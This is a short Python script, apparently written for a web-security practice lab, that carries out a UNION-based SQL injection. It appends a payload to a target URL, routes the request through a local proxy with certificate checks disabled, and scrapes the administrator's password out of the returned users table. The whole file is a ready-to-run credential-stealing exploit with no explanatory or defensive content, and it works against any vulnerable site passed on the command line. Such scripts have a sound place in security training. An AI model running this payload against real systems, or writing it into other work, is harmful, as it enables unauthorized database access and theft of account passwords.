import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def exploit_sql_users_table(url):
    # path = '/filter?category=Gifts'
    sql_payload = "'union select username,password from users--"
    r = requests.get(url + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password.")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(string ="administrator").parent.findNext('td').contents[0]
        print("[+] The administrator password is '%s'" % admin_password)
        return True
    return False    

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-]Usages: %s <url> <payload>" % sys.argv[0])
        print("[-]Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Dumping the list of username and Passwords.......")
    if not exploit_sql_users_table(url):
        print("[-] Did not find an administrator password.")